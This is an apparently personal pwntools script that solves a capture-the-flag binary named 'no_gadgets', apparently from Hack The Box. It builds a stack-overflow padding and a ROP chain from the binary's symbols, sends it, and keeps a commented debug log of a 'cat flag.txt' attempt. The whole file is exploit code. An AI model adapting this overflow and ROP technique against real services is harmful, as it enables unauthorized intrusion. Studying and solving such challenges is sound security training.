#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

#128 + rbp
offset0 = 127
offset1 = 1
offset2 = 8

elf = ELF('./no_gadgets')
#libc = ELF('./libc.so.6')

padding = offset0*b'A'
padding += offset1*b'\x00'
padding += offset2*b'B'

#ip, port='161.35.168.118', 30070
#ip, port = '83.136.250.41', 46944   #HTB
#io = remote(ip,port)
io = process('./no_gadgets')
#io = gdb.debug('./no_gadgets','break main')

#gets + system
#rop_chain = p64(elf.got.gets) + p64(elf.got.system)  #ERROR! Should call PLT/SYM!!
rop_chain = p64(elf.sym.fgets) + p64(elf.sym.puts)

payload = padding + rop_chain

io.recvuntil('Data:')
io.sendline(payload)
cmd = p64(elf.got.fgets)
io.sendline(cmd)
print(io.recvline())
#io.interactive()

'''
flag -> elag
glag -> flag

[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[+] Receiving all data: Done (42B)
[DEBUG] Received 0xd bytes:
    b'cat: elag.txt'
[DEBUG] Received 0x1c bytes:
    b': No such file or directory\n'

'''
